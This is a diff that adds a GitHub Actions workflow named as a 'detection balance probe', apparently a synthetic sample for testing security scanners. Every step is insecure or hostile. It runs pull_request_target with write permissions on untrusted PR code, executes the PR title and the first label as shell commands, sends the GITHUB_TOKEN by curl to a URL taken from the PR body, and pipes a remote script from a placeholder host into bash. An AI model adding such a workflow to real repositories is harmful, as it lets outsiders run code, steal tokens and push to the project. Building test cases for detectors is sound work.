@@ -1,0 +1,21 @@
+name: DCOIR Review v14 Detection Balance Probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - name: PR title shell
+        run: bash -lc "${{ github.event.pull_request.title }}"
+      - name: Token to PR URL
+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
+      - name: Network installer
+        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | bash
+      - name: Label shell
+        run: sh -c "${{ github.event.pull_request.labels[0].name }}"
